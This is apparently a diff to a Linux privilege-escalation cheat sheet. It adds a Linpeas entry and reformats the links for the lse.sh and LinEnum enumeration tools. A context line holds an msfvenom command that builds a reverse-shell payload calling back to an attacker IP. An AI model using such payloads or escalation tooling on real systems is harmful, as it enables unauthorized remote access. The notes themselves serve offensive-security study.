@@ -57,7 +57,7 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT
 
 ## Tools
 #### Ise.sh (favorite from tib3rius)
-https://github.com/diego-treitos/linux-smart-enumeration
+- https://github.com/diego-treitos/linux-smart-enumeration
 
 ```
 ./lse.sh
@@ -66,13 +66,19 @@ https://github.com/diego-treitos/linux-smart-enumeration
 ```
 
 #### Linenum
-https://github.com/rebootuser/LinEnum
+- https://github.com/rebootuser/LinEnum
 
 ```
 ./linEnum.sh
 ./linEnum.sh -k <PASSWORD> -e export -t
 ```
 
+#### Linpeas
+- https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+```
+./linpeash.sh
+```
+  
 ## Manual Enumeration
 #### Check the current user
 ```
